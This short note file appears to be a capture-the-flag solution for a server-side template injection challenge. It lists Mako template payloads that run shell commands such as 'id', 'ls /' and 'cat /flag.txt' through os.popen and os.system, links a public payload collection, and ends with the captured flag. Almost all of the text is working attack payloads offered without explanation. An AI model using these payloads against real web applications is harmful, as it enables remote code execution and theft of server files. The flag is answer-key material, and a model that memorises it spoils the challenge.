'''
STTI

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

<%
import os
x=os.popen('id').read()
%>
${x}

${self.module.cache.util.os.system("id")}

${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.popen('ls /').read()}
${self.module.cache.util.os.popen('cat /flag.txt').read()}

HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}

'''
